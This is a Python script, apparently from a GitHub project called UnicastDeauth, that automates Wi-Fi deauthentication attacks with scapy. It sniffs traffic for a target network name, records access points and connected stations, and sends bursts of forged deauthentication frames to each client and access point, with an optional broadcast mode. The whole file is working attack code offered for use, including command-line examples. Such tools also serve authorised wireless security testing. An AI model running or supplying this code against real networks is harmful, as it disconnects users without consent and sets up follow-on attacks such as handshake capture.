#!/usr/bin/env python3

# UnicastDeauth is a simple Python 3 script that automates unicast Wi-Fi deauthentication attacks
# author - mamatb (t.me/m_amatb)
# location - https://github.com/mamatb/UnicastDeauth
# style guide - https://google.github.io/styleguide/pyguide.html

# TODO
#
# add module docstring
# check for protected management frames

import argparse
from collections import abc
import multiprocessing
import re
from scapy import sendrecv
from scapy.layers import dot11
import sys
import typing

BROADCAST = 'ff:ff:ff:ff:ff:ff'
DEAUTH_COUNT = 64

class MsgException(Exception):
    _count = 0
    
    def __init__(self, message: str, *args, **kwargs) -> None:
        super().__init__(*args, **kwargs)
        self._message = message
        MsgException._count += 1
        self._count = MsgException._count
    
    def __str__(self) -> str:
        output = []
        if self._count == MsgException._count:
            output.append('[!] Exception: ')
        output.append(f'{self._message}')
        if self.__cause__:
            output.append('. Caused by:\n')
            output.append('    ' * (MsgException._count - self._count + 1))
            output.append(f'[!] Exception: {self.__cause__}')
        return ''.join(output)
    
    def panic(self) -> None:
        print(self, file = sys.stderr)

class AccessPoints:
    _bssid_regex = re.compile('^([0-9a-f]{2}:){5}[0-9a-f]{2}$')
    
    def __init__(self, essid: str, bssids: str) -> None:
        self._essid = essid
        self._bssids = set()
        for bssid in bssids.split(','):
            bssid = bssid.strip().lower()
            if AccessPoints._bssid_regex.match(bssid):
                self._bssids.add(bssid)
    
    def __iter__(self) -> abc.Iterator[str]:
        for bssid in self._bssids:
            yield bssid
    
    @property
    def essid(self) -> str:
      return self._essid
    
    def add(self, bssid: str) -> None:
        self._bssids.add(bssid)
        print_info(
            f'AP detected for network {self._essid}'
            f'\n    access point = {bssid}'
        )

class Stations:
    def __init__(self, essid: str) -> None:
        self._essid = essid
        self._bssids = {} # {bssid_sta: bssid_ap}
    
    def __getitem__(self, bssid_sta: str) -> typing.Optional[str]:
        return self._bssids.get(bssid_sta)
    
    def __setitem__(self, bssid_sta: str, bssid_ap: str) -> None:
        self._bssids[bssid_sta] = bssid_ap
        print_info(
            f'STA detected for network {self._essid}'
            f'\n    station      = {bssid_sta}'
            f'\n    access point = {bssid_ap}'
        )

class DeauthConfig:
    def __init__(self, wifi_interface: str, broadcast_enabled: bool,
                 deauth_rounds: int) -> None:
        self._wifi_interface = wifi_interface
        self._broadcast_enabled = broadcast_enabled
        self._deauth_rounds = deauth_rounds
    
    @property
    def wifi_interface(self) -> str:
        return self._wifi_interface
    
    @property
    def broadcast_enabled(self) -> bool:
        return self._broadcast_enabled
    
    @property
    def deauth_rounds(self) -> int:
        return self._deauth_rounds

def get_src_dst_net(self: dot11.RadioTap) -> tuple[str, str, str]:
    '''frame control field parsing'''
    
    try:
        to_ds = self.FCfield & 0x1
        from_ds = self.FCfield & 0x2
        if to_ds:
            if from_ds:
                bssid_src = bssid_dst = bssid_net = ''
            else:
                bssid_src = self.addr2
                bssid_dst = self.addr3
                bssid_net = self.addr1
        else:
            bssid_dst = self.addr1
            if from_ds:
                bssid_src = self.addr3
                bssid_net = self.addr2
            else:
                bssid_src = self.addr2
                bssid_net = self.addr3
        return bssid_src, bssid_dst, bssid_net
    except Exception as e:
        raise MsgException('Frame Control field could not be parsed') from e
dot11.RadioTap.get_src_dst_net = get_src_dst_net

def print_info(message: str) -> None:
    '''additional info printing'''
    
    print(f'[!] Info: {message}', file = sys.stderr)

def is_unicast(bssid: str) -> bool:
    '''bssid categorizing'''
    
    try:
        return not (int(bssid.split(':')[0], 16) & 0x1)
    except Exception as e:
        raise MsgException('BSSID could not be categorized') from e

def unicast_deauth(deauth_config: DeauthConfig, bssid_sta: str, bssid_ap: str,
                   bssid_net: str) -> None:
    '''unicast deauthentication'''
    
    try:
        def unicast_deauth_parallel() -> None:
            sys.stderr = sys.stdout = None
            for _ in range(deauth_config.deauth_rounds):
                sendrecv.sendp(
                    dot11.RadioTap() /
                        dot11.Dot11(
                            addr1 = bssid_sta,
                            addr2 = bssid_ap,
                            addr3 = bssid_net,
                        ) /
                        dot11.Dot11Deauth(reason = 7),
                    iface = deauth_config.wifi_interface,
                    count = DEAUTH_COUNT,
                    verbose = False,
                )
                sendrecv.sendp(
                    dot11.RadioTap() /
                        dot11.Dot11(
                            addr1 = bssid_ap,
                            addr2 = bssid_sta,
                            addr3 = bssid_net,
                        ) /
                        dot11.Dot11Deauth(reason = 7),
                    iface = deauth_config.wifi_interface,
                    count = DEAUTH_COUNT,
                    verbose = False,
                )
        multiprocessing.Process(target = unicast_deauth_parallel).start()
        print_info(
            f'sending {deauth_config.deauth_rounds} x {DEAUTH_COUNT}'
            f' deauthentication frames from AP {bssid_ap} to STA {bssid_sta}'
        )
        print_info(
            f'sending {deauth_config.deauth_rounds} x {DEAUTH_COUNT}'
            f' deauthentication frames from STA {bssid_sta} to AP {bssid_ap}'
        )
    except Exception as e:
        raise MsgException('unicast deauthentication frames could not be sent') from e

def broadcast_deauth(deauth_config: DeauthConfig, bssid_ap: str, bssid_net: str) -> None:
    '''broadcast deauthentication'''
    
    try:
        def broadcast_deauth_parallel() -> None:
            sys.stderr = sys.stdout = None
            for _ in range(deauth_config.deauth_rounds):
                sendrecv.sendp(
                    dot11.RadioTap() /
                        dot11.Dot11(
                            addr1 = BROADCAST,
                            addr2 = bssid_ap,
                            addr3 = bssid_net,
                        ) /
                        dot11.Dot11Deauth(reason = 7),
                    iface = deauth_config.wifi_interface,
                    count = DEAUTH_COUNT,
                    verbose = False,
                )
        multiprocessing.Process(target = broadcast_deauth_parallel).start()
        print_info(
            f'sending {deauth_config.deauth_rounds} x {DEAUTH_COUNT} broadcast'
            f' deauthentication frames from AP {bssid_ap}'
        )
    except Exception as e:
        raise MsgException('broadcast deauthentication frames could not be sent') from e

def handle_beacon_proberesp(frame: dot11.RadioTap, deauth_config: DeauthConfig,
                            aps_targetlist: AccessPoints,
                            aps_whitelist: AccessPoints) -> None:
    '''beacon and probe-resp frames processing'''
    
    try:
        bssid_src, bssid_dst, bssid_net = frame.get_src_dst_net()
        if (
            bssid_net and
            bssid_src not in aps_targetlist and
            bssid_src not in aps_whitelist
        ):
            dot11_element = frame.getlayer(dot11.Dot11Elt)
            while dot11_element:
                if dot11_element.ID == 0:
                    if dot11_element.info == bytes(aps_targetlist.essid, 'utf-8'):
                        aps_targetlist.add(bssid_src)
                        if deauth_config.broadcast_enabled:
                            broadcast_deauth(deauth_config, bssid_src, bssid_net)
                    break
                dot11_element = dot11_element.payload.getlayer(dot11.Dot11Elt)
    except Exception as e:
        raise MsgException('beacon/probe-resp frame could not be processed') from e

def handle_probereq(frame: dot11.RadioTap, deauth_config: DeauthConfig,
                    aps_targetlist: AccessPoints, aps_whitelist :AccessPoints) -> None:
    '''probe-req frames processing'''
    
    try:
        bssid_src, bssid_dst, bssid_net = frame.get_src_dst_net()
        if (
            bssid_net and
            is_unicast(bssid_dst) and
            bssid_dst not in aps_targetlist and
            bssid_dst not in aps_whitelist
        ):
            dot11_element = frame.getlayer(dot11.Dot11Elt)
            while dot11_element:
                if dot11_element.ID == 0:
                    if dot11_element.info == bytes(aps_targetlist.essid, 'utf-8'):
                        aps_targetlist.add(bssid_dst)
                        if deauth_config.broadcast_enabled:
                            broadcast_deauth(deauth_config, bssid_dst, bssid_net)
                    break
                dot11_element = dot11_element.payload.getlayer(dot11.Dot11Elt)
    except Exception as e:
        raise MsgException('probe-req frame could not be processed') from e

def handle_ctl_data(frame: dot11.RadioTap, deauth_config: DeauthConfig,
                    aps_targetlist: AccessPoints, stations: Stations) -> None:
    '''ctl and data frames processing'''
    
    try:
        bssid_src, bssid_dst, bssid_net = frame.get_src_dst_net()
        if bssid_net:
            if (
                is_unicast(bssid_dst) and
                bssid_src in aps_targetlist and
                stations[bssid_dst] != bssid_src
            ):
                stations[bssid_dst] = bssid_src
                unicast_deauth(deauth_config, bssid_dst, bssid_src, bssid_net)
            elif (
                bssid_dst in aps_targetlist and
                stations[bssid_src] != bssid_dst
            ):
                stations[bssid_src] = bssid_dst
                unicast_deauth(deauth_config, bssid_src, bssid_dst, bssid_net)
    except Exception as e:
        raise MsgException('ctl/data frame could not be processed') from e

def sniffer_wrapper(deauth_config: DeauthConfig, aps_targetlist: AccessPoints,
                    aps_whitelist: AccessPoints, stations: Stations) -> None:
    def sniffer_handler(frame: dot11.RadioTap) -> None:
        '''sniffed frames processing'''
        
        try:
            if frame.haslayer(dot11.Dot11Beacon) or frame.haslayer(dot11.Dot11ProbeResp):
                handle_beacon_proberesp(
                    frame,
                    deauth_config,
                    aps_targetlist,
                    aps_whitelist,
                )
            elif frame.haslayer(dot11.Dot11ProbeReq):
                handle_probereq(
                    frame,
                    deauth_config,
                    aps_targetlist,
                    aps_whitelist,
                )
            else:
                handle_ctl_data(
                    frame,
                    deauth_config,
                    aps_targetlist,
                    stations,
                )
        except Exception as e:
            raise MsgException('sniffed frame could not be processed') from e
    return sniffer_handler

def main() -> None:
    '''main'''
    
    try:
        examples = [
            'examples:',
            'UnicastDeauth.py -i wlan0 -e NETGEAR -b',
            'UnicastDeauth.py -i wlan0 -e NETGEAR -n 8',
            'UnicastDeauth.py -i wlan0 -e NETGEAR -tl 00:11:22:33:44:00,00:11:22:33:44:55',
            'UnicastDeauth.py -i wlan0 -e NETGEAR -wl 00:11:22:33:44:00,00:11:22:33:44:55',
        ]
        parser = argparse.ArgumentParser(
            description = (
                'UnicastDeauth is a simple Python 3 script that automates'
                ' unicast Wi-Fi deauthentication attacks'
            ),
            formatter_class = argparse.RawTextHelpFormatter,
            epilog = '\n  '.join(examples),
        )
        parser.add_argument(
            '-i',
            dest = 'wifi_interface',
            required = True,
            help = 'attacker Wi-Fi interface',
        )
        parser.add_argument(
            '-e',
            dest = 'essid',
            required = True,
            help = 'target ESSID',
        )
        parser.add_argument(
            '-b',
            dest = 'broadcast_enabled',
            action = 'store_true',
            help = 'enable broadcast deauthentication',
        )
        parser.add_argument(
            '-n',
            dest = 'deauth_rounds',
            type = int,
            default = 1,
            help = 'number of deauthentication rounds',
        )
        parser.add_argument(
            '-tl',
            dest = 'aps_targetlist',
            default = '',
            help = 'comma-separated known target APs',
        )
        parser.add_argument(
            '-wl',
            dest = 'aps_whitelist',
            default = '',
            help = 'comma-separated APs whitelist',
        )
        args = parser.parse_args()
        filters = [
            'wlan type mgt subtype beacon',
            'wlan type mgt subtype probe-req',
            'wlan type mgt subtype probe-resp',
            'wlan type ctl',
            'wlan type data',
        ]
        deauth_config = DeauthConfig(
            args.wifi_interface,
            args.broadcast_enabled,
            args.deauth_rounds,
        )
        aps_targetlist = AccessPoints(args.essid, args.aps_targetlist)
        aps_whitelist = AccessPoints(args.essid, args.aps_whitelist)
        stations = Stations(args.essid)
        if deauth_config.broadcast_enabled:
            for bssid in aps_targetlist:
                broadcast_deauth(deauth_config, bssid, bssid)
        sendrecv.sniff(
            iface = args.wifi_interface,
            filter = ' or '.join(filters),
            prn = sniffer_wrapper(deauth_config, aps_targetlist, aps_whitelist, stations),
        )
    except MsgException as msg_exception:
        msg_exception.panic()
    except Exception as e:
        MsgException(e).panic()
    finally:
        try:
            for child in multiprocessing.active_children():
                child.terminate()
        except:
            sys.exit(-1)

if __name__ == '__main__':
    main()
